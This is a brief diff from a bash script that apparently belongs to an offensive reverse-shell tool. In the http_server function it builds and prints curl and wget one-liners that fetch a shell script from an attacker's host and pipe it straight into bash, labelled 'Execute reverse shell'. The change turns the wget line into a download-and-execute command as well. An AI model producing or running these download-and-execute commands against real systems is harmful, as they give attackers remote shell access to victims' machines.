@@ -168,7 +168,7 @@ function rev_file(){
 function http_server(){
 	# Uses wget's option to write to stdout, so nothing is stored in memory ;\)
 	curl_cmd=$(echo "curl http://$IP:$http_port/shell.sh | bash" | sed -e "s/:80\//\//g")
-	wget_cmd=$(echo "wget -O - http://$IP:$http_port/shell.bash" | sed -e "s/:80\//\//g")
+	wget_cmd=$(echo "wget -O - http://$IP:$http_port/shell | bash" | sed -e "s/:80\//\//g")
 	echo $RED"[*] "$NC"Execute reverse shell:"
 	echo "$curl_cmd"
 	echo "$wget_cmd"
